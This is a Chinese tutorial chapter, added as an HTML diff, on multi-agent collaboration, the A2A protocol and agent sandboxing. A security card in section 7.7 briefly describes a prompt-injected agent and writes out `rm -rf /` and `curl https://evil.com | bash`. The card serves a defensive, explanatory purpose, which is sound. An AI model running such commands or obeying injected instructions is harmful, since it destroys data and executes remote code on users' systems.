@@ -1,0 +1,1387 @@
+<!-- 第7章：多智能体协作 -->
+<h1 class="chapter-title">第7章 多智能体协作</h1>
+<p class="chapter-subtitle">从一个 Agent 到一个 Agent 团队</p>
+
+<!-- ===== 7.1 为什么需要多 Agent ===== -->
+<h2 class="section-heading">7.1 单 Agent 的瓶颈</h2>
+
+<p>单个 Agent 就像一个"全栈工程师"——什么都干。但随着任务复杂度提升，瓶颈出现：</p>
+
+<div class="card">
+  <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 16px;">
+    <div style="padding: 16px; border: 1px solid var(--color-border); border-radius: 8px; border-left: 3px solid var(--color-error);">
+      <strong style="color: var(--color-error);">❌ 单 Agent 的瓶颈</strong>
+      <ul style="font-size: 13px; color: var(--color-text-secondary); padding-left: 18px; line-height: 1.8; margin: 8px 0 0;">
+        <li>Prompt 膨胀：所有工具+规则塞一个 prompt</li>
+        <li>角色混乱：又要搜索又要分析又要写报告</li>
+        <li>错误传播：一步错步步错，无法纠偏</li>
+        <li>上下文爆炸：长任务 token 消耗线性增长</li>
+        <li>无法并行：串行执行效率低</li>
+      </ul>
+    </div>
+    <div style="padding: 16px; border: 1px solid var(--color-border); border-radius: 8px; border-left: 3px solid var(--color-success);">
+      <strong style="color: var(--color-success);">✅ 多 Agent 的优势</strong>
+      <ul style="font-size: 13px; color: var(--color-text-secondary); padding-left: 18px; line-height: 1.8; margin: 8px 0 0;">
+        <li>职责分离：每个 Agent 专注一个角色</li>
+        <li>Prompt 精简：每个 Agent 只需自己的工具和规则</li>
+        <li>互相纠错：Agent 之间可以审查和纠正</li>
+        <li>并行执行：独立子任务同时进行</li>
+        <li>可扩展：新增能力只需加新 Agent</li>
+      </ul>
+    </div>
+  </div>
+</div>
+
+<div class="quote">
+  一个人干不过一个团队。单 Agent 是全栈工程师，多 Agent 是专业团队。
+</div>
+
+<!-- ===== 7.2 多 Agent 协作模式 ===== -->
+<h2 class="section-heading">7.2 四种经典协作模式</h2>
+
+<div class="flowchart-container" id="multiAgentPatterns"></div>
+
+<script>
+setTimeout(() => {
+  // 渲染四种模式的流程图
+  const container = document.getElementById('multiAgentPatterns');
+  container.innerHTML = `
+    <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 24px; margin: 20px 0;">
+      
+      <!-- 模式1: 串行流水线 -->
+      <div style="padding: 16px; border: 1px solid var(--color-border); border-radius: 12px;">
+        <h3 style="color: var(--color-info); margin: 0 0 12px;">① 串行流水线（Pipeline）</h3>
+        <div style="display: flex; align-items: center; gap: 8px; flex-wrap: wrap; font-size: 13px;">
+          <span style="padding: 6px 12px; background: var(--color-bg-alt); border-radius: 6px;">搜索Agent</span>
+          <span style="color: var(--color-text-tertiary);">→</span>
+          <span style="padding: 6px 12px; background: var(--color-bg-alt); border-radius: 6px;">分析Agent</span>
+          <span style="color: var(--color-text-tertiary);">→</span>
+          <span style="padding: 6px 12px; background: var(--color-bg-alt); border-radius: 6px;">写作Agent</span>
+        </div>
+        <p style="font-size: 12px; color: var(--color-text-secondary); margin: 12px 0 0;">每个 Agent 处理一个阶段，输出传给下一个。简单可靠，但无法并行。</p>
+      </div>
+      
+      <!-- 模式2: 编排者-执行者 -->
+      <div style="padding: 16px; border: 1px solid var(--color-border); border-radius: 12px;">
+        <h3 style="color: var(--color-accent); margin: 0 0 12px;">② 编排者-执行者（Orchestrator）</h3>
+        <div style="display: flex; flex-direction: column; align-items: center; gap: 8px; font-size: 13px;">
+          <span style="padding: 6px 12px; background: var(--color-bg-alt); border-radius: 6px; border: 1px solid var(--color-accent);">编排者 Agent</span>
+          <span style="color: var(--color-text-tertiary);">↓ ↙ ↓ ↘</span>
+          <div style="display: flex; gap: 8px;">
+            <span style="padding: 4px 8px; background: var(--color-bg-alt); border-radius: 6px;">Agent A</span>
+            <span style="padding: 4px 8px; background: var(--color-bg-alt); border-radius: 6px;">Agent B</span>
+            <span style="padding: 4px 8px; background: var(--color-bg-alt); border-radius: 6px;">Agent C</span>
+          </div>
+        </div>
+        <p style="font-size: 12px; color: var(--color-text-secondary); margin: 12px 0 0;">编排者分配任务，执行者各自完成后汇报。支持并行。</p>
+      </div>
+      
+      <!-- 模式3: 辩论对抗 -->
+      <div style="padding: 16px; border: 1px solid var(--color-border); border-radius: 12px;">
+        <h3 style="color: var(--color-success); margin: 0 0 12px;">③ 辩论对抗（Debate）</h3>
+        <div style="display: flex; justify-content: center; gap: 16px; font-size: 13px; align-items: center;">
+          <span style="padding: 6px 12px; background: var(--color-bg-alt); border-radius: 6px;">正方 Agent</span>
+          <span style="color: var(--color-error);">⇄</span>
+          <span style="padding: 6px 12px; background: var(--color-bg-alt); border-radius: 6px;">反方 Agent</span>
+        </div>
+        <p style="font-size: 12px; color: var(--color-text-secondary); margin: 12px 0 0;">多个 Agent 对抗辩论，裁判 Agent 总结。适合需要多角度分析的任务。</p>
+      </div>
+      
+      <!-- 模式4: 自主协作 -->
+      <div style="padding: 16px; border: 1px solid var(--color-border); border-radius: 12px;">
+        <h3 style="color: var(--color-warning); margin: 0 0 12px;">④ 自主协作（Autonomous）</h3>
+        <div style="display: flex; justify-content: center; gap: 8px; font-size: 13px; flex-wrap: wrap;">
+          <span style="padding: 4px 8px; background: var(--color-bg-alt); border-radius: 6px;">Agent A</span>
+          <span style="color: var(--color-text-tertiary);">⇄</span>
+          <span style="padding: 4px 8px; background: var(--color-bg-alt); border-radius: 6px;">Agent B</span>
+          <span style="color: var(--color-text-tertiary);">⇄</span>
+          <span style="padding: 4px 8px; background: var(--color-bg-alt); border-radius: 6px;">Agent C</span>
+        </div>
+        <p style="font-size: 12px; color: var(--color-text-secondary); margin: 12px 0 0;">Agent 之间自由通信、协商。最灵活但最难控制。代表：AutoGen。</p>
+      </div>
+      
+    </div>
+  `;
+}, 300);
+</script>
+
+<!-- ===== 7.3 编排者-执行者详解 ===== -->
+<h2 class="section-heading">7.3 编排者-执行者模式详解</h2>
+
+<p>这是最常用的多 Agent 模式。编排者（Orchestrator）像项目经理，执行者（Worker）像各专业工程师。</p>
+
+<div class="flowchart-container" id="orchestratorFlow"></div>
+
+<script>
+setTimeout(() => {
+  FlowChart.render('orchestratorFlow', {
+    nodes: [
+      { id: 'user', label: '用户请求', type: 'start' },
+      { id: 'orch', label: '编排者 Agent\n(分析+分配)', type: 'decision' },
+      { id: 'search', label: '搜索 Agent\n(信息收集)', type: 'tool' },
+      { id: 'code', label: '代码 Agent\n(数据处理)', type: 'tool' },
+      { id: 'write', label: '写作 Agent\n(报告生成)', type: 'tool' },
+      { id: 'orch2', label: '编排者 Agent\n(整合+检查)', type: 'process' },
+      { id: 'output', label: '返回用户', type: 'end' }
+    ],
+    edges: [
+      { from: 'user', to: 'orch' },
+      { from: 'orch', to: 'search', label: '分配' },
+      { from: 'orch', to: 'code', label: '分配' },
+      { from: 'search', to: 'orch2', label: '结果' },
+      { from: 'code', to: 'orch2', label: '结果' },
+      { from: 'orch2', to: 'write', label: '需要报告' },
+      { from: 'orch2', to: 'output', label: '完成' },
+      { from: 'write', to: 'output' }
+    ],
+    animate: true
+  });
+}, 500);
+</script>
+
+<h3 class="sub-heading">编排者的核心职责</h3>
+
+<div class="code-block">
+  <span class="code-label">编排者 Agent 的 Prompt 示例</span>
+<pre>你是一个任务编排者。你的职责：
+
+1. <strong>分析任务</strong>：理解用户需求，判断需要哪些专业 Agent
+2. <strong>分配任务</strong>：将子任务分配给合适的 Worker Agent
+3. <strong>整合结果</strong>：收集各 Agent 的输出，整合成完整答案
+4. <strong>质量控制</strong>：检查结果是否完整、正确，必要时重新分配
+
+<strong>可用的 Worker Agent：</strong>
+- search_agent: 擅长搜索和信息收集
+- code_agent: 擅长写代码和数据处理
+- writer_agent: 擅长写作和报告生成
+
+<strong>输出格式：</strong>
+{"assign": "agent_name", "task": "具体任务描述"}
+或
+{"final_answer": "整合后的完整回答"}</pre>
+</div>
+
+<!-- ===== 7.4 通信机制 ===== -->
+<h2 class="section-heading">7.4 Agent 之间的通信机制</h2>
+
+<p>多 Agent 要协作，必须有通信机制。三种主流方案：</p>
+
+<div class="card">
+  <table style="width: 100%; border-collapse: collapse; font-size: 14px;">
+    <thead>
+      <tr style="border-bottom: 2px solid var(--color-border);">
+        <th style="text-align: left; padding: 12px 8px;">方案</th>
+        <th style="text-align: left; padding: 12px 8px;">原理</th>
+        <th style="text-align: left; padding: 12px 8px;">代表框架</th>
+        <th style="text-align: left; padding: 12px 8px;">优缺点</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr style="border-bottom: 1px solid var(--color-border-light);">
+        <td style="padding: 10px 8px; font-weight: 500; color: var(--color-info);">消息传递</td>
+        <td style="padding: 10px 8px; color: var(--color-text-secondary);">Agent 通过消息队列通信</td>
+        <td style="padding: 10px 8px; color: var(--color-text-secondary);">AutoGen</td>
+        <td style="padding: 10px 8px; color: var(--color-text-secondary);">✓灵活 ✗可能死锁</td>
+      </tr>
+      <tr style="border-bottom: 1px solid var(--color-border-light);">
+        <td style="padding: 10px 8px; font-weight: 500; color: var(--color-accent);">共享黑板</td>
+        <td style="padding: 10px 8px; color: var(--color-text-secondary);">共享一块"黑板"读写</td>
+        <td style="padding: 10px 8px; color: var(--color-text-secondary);">CrewAI</td>
+        <td style="padding: 10px 8px; color: var(--color-text-secondary);">✓简单 ✗并发冲突</td>
+      </tr>
+      <tr>
+        <td style="padding: 10px 8px; font-weight: 500; color: var(--color-success);">图结构</td>
+        <td style="padding: 10px 8px; color: var(--color-text-secondary);">定义节点和边的DAG</td>
+        <td style="padding: 10px 8px; color: var(--color-text-secondary);">LangGraph</td>
+        <td style="padding: 10px 8px; color: var(--color-text-secondary);">✓可控 ✗不够灵活</td>
+      </tr>
+    </tbody>
+  </table>
+</div>
+
+<!-- ===== 7.5 主流框架对比 ===== -->
+<h2 class="section-heading">7.5 主流多 Agent 框架对比</h2>
+
+<div class="card">
+  <div class="card-title">🏗️ 四大框架横向对比</div>
+  <table style="width: 100%; border-collapse: collapse; font-size: 14px; margin-top: 12px;">
+    <thead>
+      <tr style="border-bottom: 2px solid var(--color-border);">
+        <th style="text-align: left; padding: 10px 8px;">框架</th>
+        <th style="text-align: left; padding: 10px 8px;">核心模式</th>
+        <th style="text-align: left; padding: 10px 8px;">通信方式</th>
+        <th style="text-align: left; padding: 10px 8px;">特点</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr style="border-bottom: 1px solid var(--color-border-light);">
+        <td style="padding: 10px 8px; font-weight: 500; color: var(--color-info);">LangGraph</td>
+        <td style="padding: 10px 8px; color: var(--color-text-secondary);">图结构</td>
+        <td style="padding: 10px 8px; color: var(--color-text-secondary);">状态传递</td>
+        <td style="padding: 10px 8px; color: var(--color-text-secondary);">可控性强、可可视化</td>
+      </tr>
+      <tr style="border-bottom: 1px solid var(--color-border-light);">
+        <td style="padding: 10px 8px; font-weight: 500; color: var(--color-accent);">AutoGen</td>
+        <td style="padding: 10px 8px; color: var(--color-text-secondary);">消息传递</td>
+        <td style="padding: 10px 8px; color: var(--color-text-secondary);">对话式</td>
+        <td style="padding: 10px 8px; color: var(--color-text-secondary);">灵活、支持自由对话</td>
+      </tr>
+      <tr style="border-bottom: 1px solid var(--color-border-light);">
+        <td style="padding: 10px 8px; font-weight: 500; color: var(--color-success);">CrewAI</td>
+        <td style="padding: 10px 8px; color: var(--color-text-secondary);">角色扮演</td>
+        <td style="padding: 10px 8px; color: var(--color-text-secondary);">任务传递</td>
+        <td style="padding: 10px 8px; color: var(--color-text-secondary);">易上手、角色化</td>
+      </tr>
+      <tr>
+        <td style="padding: 10px 8px; font-weight: 500; color: var(--color-warning);">MetaGPT</td>
+        <td style="padding: 10px 8px; color: var(--color-text-secondary);">SOP标准流程</td>
+        <td style="padding: 10px 8px; color: var(--color-text-secondary);">文档传递</td>
+        <td style="padding: 10px 8px; color: var(--color-text-secondary);">模拟软件团队</td>
+      </tr>
+    </tbody>
+  </table>
+</div>
+
+<!-- ===== 7.6 A2A协议（Agent-to-Agent） ===== -->
+<h2 class="section-heading">7.6 A2A协议（Agent-to-Agent）</h2>
+
+<p>2025年4月9日，Google 发布了 <strong>A2A（Agent-to-Agent）协议</strong>——一个专门解决 Agent 与 Agent 之间协作的开放标准。如果说 MCP 解决的是 Agent 与工具的连接，那么 A2A 解决的是 Agent 与 Agent 的连接。</p>
+
+<div class="quote">
+  MCP 管 Agent ↔ 工具，A2A 管 Agent ↔ Agent。一个管"手"，一个管"嘴"。
+</div>
+
+<h3 class="sub-heading">为什么需要 A2A？</h3>
+
+<p>多 Agent 协作时，最大的痛点是<strong>互不相识</strong>：一个 Agent 不知道另一个 Agent 能做什么、怎么调用它。现有的框架（LangGraph、CrewAI等）只能在同一个系统内协作，跨系统的 Agent 之间几乎无法沟通。</p>
+
+<div class="card" style="border-left: 3px solid var(--color-error);">
+  <strong>跨框架协作困境：</strong>LangGraph 的 Agent 无法直接调用 CrewAI 的 Agent，AutoGen 的 Agent 无法发现 Dify 上的 Agent。每个框架都是一座孤岛。
+</div>
+
+<p>A2A 协议的目标就是打破这些孤岛，让任何 Agent 都能<strong>发现、识别、协作</strong>其他 Agent，无论它们跑在哪个框架上。</p>
+
+<h3 class="sub-heading">A2A 的四大核心机制</h3>
+
+<div class="card">
+  <div class="card-title">🔐 A2A 协议四大核心机制</div>
+  <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 16px; margin-top: 16px;">
+    <div style="padding: 16px; border: 1px solid var(--color-border); border-radius: 8px; border-top: 3px solid var(--color-info);">
+      <strong style="color: var(--color-info);">① Agent Card — 能力发现</strong>
+      <p style="font-size: 13px; color: var(--color-text-secondary); margin: 8px 0 0;">
+        每个 Agent 发布一个 JSON 元数据文件（Agent Card），描述自己的能力、技能、认证方式和交互协议。其他 Agent 通过读取 Agent Card 就能知道"你能做什么"。
+      </p>
+    </div>
+    <div style="padding: 16px; border: 1px solid var(--color-border); border-radius: 8px; border-top: 3px solid var(--color-accent);">
+      <strong style="color: var(--color-accent);">② Task 生命周期管理</strong>
+      <p style="font-size: 13px; color: var(--color-text-secondary); margin: 8px 0 0;">
+        定义 Task 的完整生命周期：创建（created）→ 运行（working）→ 完成（completed）/ 失败（failed）/ 拒绝（rejected）。状态变更实时同步，支持长时间任务。
+      </p>
+    </div>
+    <div style="padding: 16px; border: 1px solid var(--color-border); border-radius: 8px; border-top: 3px solid var(--color-success);">
+      <strong style="color: var(--color-success);">③ 消息协作</strong>
+      <p style="font-size: 13px; color: var(--color-text-secondary); margin: 8px 0 0;">
+        Agent 之间通过结构化消息（Message）传递协作信息。消息可包含文本、文件、表单等多种内容类型，支持多轮交互和上下文累积。
+      </p>
+    </div>
+    <div style="padding: 16px; border: 1px solid var(--color-border); border-radius: 8px; border-top: 3px solid var(--color-warning);">
+      <strong style="color: var(--color-warning);">④ 安全认证机制</strong>
+      <p style="font-size: 13px; color: var(--color-text-secondary); margin: 8px 0 0;">
+        基于 OAuth2.0 / OpenID Connect 的认证体系。Agent 之间的每次交互都需要身份验证和权限校验，确保只有授权的 Agent 才能发起协作。
+      </p>
+    </div>
+  </div>
+</div>
+
+<h3 class="sub-heading">Agent Card：Agent 的"简历"</h3>
+
+<p>Agent Card 是 A2A 协议中最重要的概念——它就像 Agent 的一份公开简历，让其他 Agent 可以"读简历、识能力、定合作"。</p>
+
+<div class="code-block">
+  <span class="code-label">Agent Card 示例（JSON 格式）</span>
+<pre>{
+  "name": "旅行规划Agent",
+  "description": "帮助用户规划旅行路线、预订机票酒店",
+  "url": "https://travel-agent.example.com/a2a",
+  "capabilities": [
+    {
+      "name": "route_planning",
+      "description": "根据目的地和偏好规划最优路线"
+    },
+    {
+      "name": "hotel_booking",
+      "description": "预订酒店并管理订单"
+    }
+  ],
+  "authentication": {
+    "schemes": ["oauth2"]
+  },
+  "inputModes": ["text", "image"],
+  "outputModes": ["text", "file"]
+}</pre>
+</div>
+
+<p>有了 Agent Card，一个"天气查询 Agent"就能发现"旅行规划 Agent"的存在，并了解它的能力，从而主动发起协作。</p>
+
+<h3 class="sub-heading">Task 生命周期管理</h3>
+
+<p>A2A 协议定义了 Task 的完整状态流转。一个 Task 从创建到完成，经历多个状态：</p>
+
+<div class="flowchart-container" id="a2aTaskLifecycle"></div>
+
+<script>
+setTimeout(() => {
+  FlowChart.render('a2aTaskLifecycle', {
+    nodes: [
+      { id: 'create', label: 'Task 创建\n(created)', type: 'start' },
+      { id: 'working', label: '运行中\n(working)', type: 'process' },
+      { id: 'input', label: '等待输入\n(input-required)', type: 'decision' },
+      { id: 'complete', label: '完成\n(completed)', type: 'end' },
+      { id: 'failed', label: '失败\n(failed)', type: 'end' },
+      { id: 'rejected', label: '拒绝\n(rejected)', type: 'end' }
+    ],
+    edges: [
+      { from: 'create', to: 'working' },
+      { from: 'working', to: 'complete', label: '成功' },
+      { from: 'working', to: 'failed', label: '异常' },
+      { from: 'working', to: 'input', label: '需补充' },
+      { from: 'input', to: 'working', label: '提供输入' },
+      { from: 'create', to: 'rejected', label: '不符合' }
+    ],
+    animate: true
+  });
+}, 600);
+</script>
+
+<p>关键设计：Task 支持<strong>长时间运行</strong>和<strong>状态推送</strong>。发起方可以通过轮询或推送获取 Task 状态变更，无需阻塞等待。</p>
+
+<h3 class="sub-heading">A2A 与 MCP 的区别</h3>
+
+<div class="card">
+  <table style="width: 100%; border-collapse: collapse; font-size: 14px;">
+    <thead>
+      <tr style="border-bottom: 2px solid var(--color-border);">
+        <th style="text-align: left; padding: 12px 8px;">维度</th>
+        <th style="text-align: left; padding: 12px 8px;">MCP（Model Context Protocol）</th>
+        <th style="text-align: left; padding: 12px 8px;">A2A（Agent-to-Agent）</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr style="border-bottom: 1px solid var(--color-border-light);">
+        <td style="padding: 10px 8px; font-weight: 500;">连接对象</td>
+        <td style="padding: 10px 8px; color: var(--color-text-secondary);">Agent ↔ 外部工具/数据源</td>
+        <td style="padding: 10px 8px; color: var(--color-text-secondary);">Agent ↔ 另一个 Agent</td>
+      </tr>
+      <tr style="border-bottom: 1px solid var(--color-border-light);">
+        <td style="padding: 10px 8px; font-weight: 500;">类比</td>
+        <td style="padding: 10px 8px; color: var(--color-text-secondary);">USB-C：连接外设</td>
+        <td style="padding: 10px 8px; color: var(--color-text-secondary);">社交网络：发现朋友</td>
+      </tr>
+      <tr style="border-bottom: 1px solid var(--color-border-light);">
+        <td style="padding: 10px 8px; font-weight: 500;">发现机制</td>
+        <td style="padding: 10px 8px; color: var(--color-text-secondary);">无（需手动配置工具列表）</td>
+        <td style="padding: 10px 8px; color: var(--color-text-secondary);">Agent Card 自动发现</td>
+      </tr>
+      <tr style="border-bottom: 1px solid var(--color-border-light);">
+        <td style="padding: 10px 8px; font-weight: 500;">交互模式</td>
+        <td style="padding: 10px 8px; color: var(--color-text-secondary);">单向调用（调用工具获取结果）</td>
+        <td style="padding: 10px 8px; color: var(--color-text-secondary);">双向协作（多轮对话、状态同步）</td>
+      </tr>
+      <tr style="border-bottom: 1px solid var(--color-border-light);">
+        <td style="padding: 10px 8px; font-weight: 500;">发起方</td>
+        <td style="padding: 10px 8px; color: var(--color-info);">Anthropic（2024）</td>
+        <td style="padding: 10px 8px; color: var(--color-accent);">Google（2025）</td>
+      </tr>
+      <tr>
+        <td style="padding: 10px 8px; font-weight: 500;">协议层</td>
+        <td style="padding: 10px 8px; color: var(--color-text-secondary);">JSON-RPC 2.0</td>
+        <td style="padding: 10px 8px; color: var(--color-text-secondary);">HTTP + JSON（REST风格）</td>
+      </tr>
+    </tbody>
+  </table>
+</div>
+
+<div class="quote">
+  MCP 和 A2A 不是竞争关系，而是互补关系：MCP 让 Agent 有"手"（使用工具），A2A 让 Agent 有"嘴"（与其他 Agent 协作）。一个完整的 Agent 生态两者缺一不可。
+</div>
+
+<h3 class="sub-heading">A2A 协作流程图</h3>
+
+<p>以"旅行规划 + 天气查询"的跨 Agent 协作场景为例：</p>
+
+<div class="flowchart-container" id="a2aCollaborationFlow"></div>
+
+<script>
+setTimeout(() => {
+  FlowChart.render('a2aCollaborationFlow', {
+    nodes: [
+      { id: 'user_req', label: '用户：\n"帮我规划下周\n去杭州的旅行"', type: 'start' },
+      { id: 'travel_agent', label: '旅行规划Agent\n(读取Agent Card)', type: 'process' },
+      { id: 'discover', label: '发现天气Agent\n(读取其Agent Card)', type: 'decision' },
+      { id: 'create_task', label: '创建Task：\n"查询杭州下周天气"', type: 'process' },
+      { id: 'weather_agent', label: '天气查询Agent\n(执行Task)', type: 'tool' },
+      { id: 'task_complete', label: 'Task完成\n(返回天气数据)', type: 'process' },
+      { id: 'travel_plan', label: '旅行规划Agent\n(整合天气+路线)', type: 'process' },
+      { id: 'output', label: '返回用户\n(完整旅行方案)', type: 'end' }
+    ],
+    edges: [
+      { from: 'user_req', to: 'travel_agent' },
+      { from: 'travel_agent', to: 'discover', label: '需要天气信息' },
+      { from: 'discover', to: 'create_task', label: '发起协作' },
+      { from: 'create_task', to: 'weather_agent', label: 'A2A协议' },
+      { from: 'weather_agent', to: 'task_complete', label: '状态: working→completed' },
+      { from: 'task_complete', to: 'travel_plan', label: '获取天气结果' },
+      { from: 'travel_plan', to: 'output' }
+    ],
+    animate: true
+  });
+}, 700);
+</script>
+
+<h3 class="sub-heading">A2A 代码示例</h3>
+
+<div class="code-block">
+  <span class="code-label">发起 A2A 协作的 Python 代码示例</span>
+<pre># A2A 协议 — 发起跨 Agent 协作
+import httpx
+
+# Step 1: 发现 Agent（读取 Agent Card）
+agent_card_url = "https://weather-agent.example.com/a2a/card.json"
+agent_card = httpx.get(agent_card_url).json()
+
+print(f"发现 Agent: {agent_card['name']}")
+print(f"能力: {agent_card['capabilities']}")
+
+# Step 2: 创建 Task（发起协作请求）
+task_payload = {
+    "id": "task-20250701-001",
+    "message": {
+        "role": "user",
+        "parts": [
+            {"type": "text", "text": "查询杭州下周天气预报"}
+        ]
+    }
+}
+
+response = httpx.post(
+    "https://weather-agent.example.com/a2a/tasks",
+    json=task_payload,
+    headers={"Authorization": "Bearer <oauth2-token>"}
+)
+
+task = response.json()
+print(f"Task 状态: {task['status']['state']}")  # working
+
+# Step 3: 获取 Task 结果（轮询或推送）
+result = httpx.get(
+    f"https://weather-agent.example.com/a2a/tasks/{task['id']}",
+    headers={"Authorization": "Bearer <oauth2-token>"}
+)
+
+if result.json()["status"]["state"] == "completed":
+    weather_data = result.json()["artifacts"]
+    print(f"天气结果: {weather_data}")</pre>
+</div>
+
+<!-- ===== 7.7 沙箱隔离与安全 ===== -->
+<h2 class="section-heading">7.7 沙箱隔离与安全</h2>
+
+<p>Agent 的强大之处在于它能<strong>执行代码、访问文件、调用API</strong>。但这也带来了巨大的安全风险——如果 Agent 执行了恶意代码，后果可能是删除文件、泄露数据、甚至攻击系统。</p>
+
+<div class="card" style="border-left: 3px solid var(--color-error);">
+  <strong>⚠️ 安全风险示例：</strong>一个代码执行 Agent 被提示词注入攻击，执行了 <code>rm -rf /</code> 或 <code>curl https://evil.com | bash</code>，后果可能是灾难性的。沙箱就是给 Agent 一个"安全房间"，即使它在房间里捣乱，也不会影响外面的世界。
+</div>
+
+<h3 class="sub-heading">为什么需要沙箱？</h3>
+
+<div class="card">
+  <div style="display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 12px;">
+    <div style="padding: 14px; border: 1px solid var(--color-border); border-radius: 8px; border-top: 3px solid var(--color-error);">
+      <strong style="color: var(--color-error);">❌ 无沙箱的风险</strong>
+      <ul style="font-size: 13px; color: var(--color-text-secondary); padding-left: 18px; line-height: 1.8; margin: 8px 0 0;">
+        <li>Agent 执行恶意代码破坏系统</li>
+        <li>Agent 访问敏感文件泄露数据</li>
+        <li>Agent 连接恶意网络泄露信息</li>
+        <li>提示词注入攻击操控 Agent</li>
+      </ul>
+    </div>
+    <div style="padding: 14px; border: 1px solid var(--color-border); border-radius: 8px; border-top: 3px solid var(--color-success);">
+      <strong style="color: var(--color-success);">✅ 沙箱的保护</strong>
+      <ul style="font-size: 13px; color: var(--color-text-secondary); padding-left: 18px; line-height: 1.8; margin: 8px 0 0;">
+        <li>代码在隔离环境中执行</li>
+        <li>文件系统访问受限制</li>
+        <li>网络连接受限制</li>
+        <li>即使被攻击也只影响沙箱</li>
+      </ul>
+    </div>
+    <div style="padding: 14px; border: 1px solid var(--color-border); border-radius: 8px; border-top: 3px solid var(--color-info);">
+      <strong style="color: var(--color-info);">🎯 最小权限原则</strong>
+      <ul style="font-size: 13px; color: var(--color-text-secondary); padding-left: 18px; line-height: 1.8; margin: 8px 0 0;">
+        <li>只给 Agent 需要的权限</li>
+        <li>文件：只允许读写指定目录</li>
+        <li>网络：只允许访问指定域名</li>
+        <li>进程：只允许执行指定命令</li>
+      </ul>
+    </div>
+  </div>
+</div>
+
+<h3 class="sub-heading">四大沙箱方案对比</h3>
+
+<div class="card">
+  <div class="card-title">🔒 沙箱方案对比表</div>
+  <table style="width: 100%; border-collapse: collapse; font-size: 13px; margin-top: 12px;">
+    <thead>
+      <tr style="border-bottom: 2px solid var(--color-border);">
+        <th style="text-align: left; padding: 10px 8px;">方案</th>
+        <th style="text-align: left; padding: 10px 8px;">隔离级别</th>
+        <th style="text-align: left; padding: 10px 8px;">原理</th>
+        <th style="text-align: left; padding: 10px 8px;">隔离维度</th>
+        <th style="text-align: left; padding: 10px 8px;">适用场景</th>
+        <th style="text-align: left; padding: 10px 8px;">成本</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr style="border-bottom: 1px solid var(--color-border-light);">
+        <td style="padding: 10px 8px; font-weight: 500; color: var(--color-info);">Docker Sandbox</td>
+        <td style="padding: 10px 8px; color: var(--color-text-secondary);">⭐⭐⭐⭐⭐ 最强</td>
+        <td style="padding: 10px 8px; color: var(--color-text-secondary);">微虚拟机独立内核</td>
+        <td style="padding: 10px 8px; color: var(--color-text-secondary);">文件+网络+进程</td>
+        <td style="padding: 10px 8px; color: var(--color-text-secondary);">高安全要求的代码执行</td>
+        <td style="padding: 10px 8px; color: var(--color-text-secondary);">较高</td>
+      </tr>
+      <tr style="border-bottom: 1px solid var(--color-border-light);">
+        <td style="padding: 10px 8px; font-weight: 500; color: var(--color-accent);">bubblewrap</td>
+        <td style="padding: 10px 8px; color: var(--color-text-secondary);">⭐⭐⭐⭐ 强</td>
+        <td style="padding: 10px 8px; color: var(--color-text-secondary);">Linux namespace隔离</td>
+        <td style="padding: 10px 8px; color: var(--color-text-secondary);">文件+网络</td>
+        <td style="padding: 10px 8px; color: var(--color-text-secondary);">Linux环境轻量沙箱</td>
+        <td style="padding: 10px 8px; color: var(--color-text-secondary);">低</td>
+      </tr>
+      <tr style="border-bottom: 1px solid var(--color-border-light);">
+        <td style="padding: 10px 8px; font-weight: 500; color: var(--color-success);">seatbelt (macOS)</td>
+        <td style="padding: 10px 8px; color: var(--color-text-secondary);">⭐⭐⭐⭐ 强</td>
+        <td style="padding: 10px 8px; color: var(--color-text-secondary);">macOS系统级沙箱</td>
+        <td style="padding: 10px 8px; color: var(--color-text-secondary);">文件+网络+进程</td>
+        <td style="padding: 10px 8px; color: var(--color-text-secondary);">macOS环境Agent沙箱</td>
+        <td style="padding: 10px 8px; color: var(--color-text-secondary);">低</td>
+      </tr>
+      <tr>
+        <td style="padding: 10px 8px; font-weight: 500; color: var(--color-warning);">E2B / PPIO</td>
+        <td style="padding: 10px 8px; color: var(--color-text-secondary);">⭐⭐⭐⭐⭐ 最强</td>
+        <td style="padding: 10px 8px; color: var(--color-text-secondary);">云端微虚拟机</td>
+        <td style="padding: 10px 8px; color: var(--color-text-secondary);">文件+网络+进程+硬件</td>
+        <td style="padding: 10px 8px; color: var(--color-text-secondary);">云端安全代码执行</td>
+        <td style="padding: 10px 8px; color: var(--color-text-secondary);">按使用计费</td>
+      </tr>
+    </tbody>
+  </table>
+</div>
+
+<h3 class="sub-heading">Anthropic 沙箱方案详解</h3>
+
+<p>Anthropic（Claude 的开发商）在 Agent 安全方面提出了两种轻量级沙箱方案：</p>
+
+<div class="card">
+  <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 16px;">
+    <div style="padding: 16px; border: 1px solid var(--color-border); border-radius: 8px; border-top: 3px solid var(--color-accent);">
+      <strong style="color: var(--color-accent);">bubblewrap（Linux）</strong>
+      <p style="font-size: 13px; color: var(--color-text-secondary); margin: 8px 0 0;">
+        利用 Linux 的 <strong>namespace</strong> 和 <strong>seccomp</strong> 机制，创建轻量隔离环境。限制文件系统访问（只允许指定目录）、限制网络访问（只允许指定端口）、限制系统调用。启动速度快（毫秒级），无需完整虚拟机。
+      </p>
+    </div>
+    <div style="padding: 16px; border: 1px solid var(--color-border); border-radius: 8px; border-top: 3px solid var(--color-success);">
+      <strong style="color: var(--color-success);">seatbelt（macOS）</strong>
+      <p style="font-size: 13px; color: var(--color-text-secondary); margin: 8px 0 0;">
+        macOS 内置的沙箱机制，通过 <strong>sandbox-exec</strong> 命令配置权限策略。可以精确控制文件读写路径、网络连接范围、进程权限。是 macOS 上最成熟的进程级沙箱方案。
+      </p>
+    </div>
+  </div>
+</div>
+
+<h3 class="sub-heading">沙箱权限配置示例</h3>
+
+<div class="code-block">
+  <span class="code-label">macOS seatbelt 沙箱配置示例</span>
+<pre>; seatbelt 沙箱策略文件 — 最小权限原则
+; 只允许 Agent 读写指定目录，访问指定网络
+
+(version 1)
+(deny default)  ; 默认拒绝所有操作
+
+; 文件权限：只允许读写工作目录
+(allow file-read* (subpath "/workspace/agent-data"))
+(allow file-write* (subpath "/workspace/agent-output"))
+
+; 网络权限：只允许访问指定API
+(allow network-outbound (regex "https://api\\.openai\\.com"))
+(allow network-outbound (regex "https://api\\.anthropic\\.com"))
+
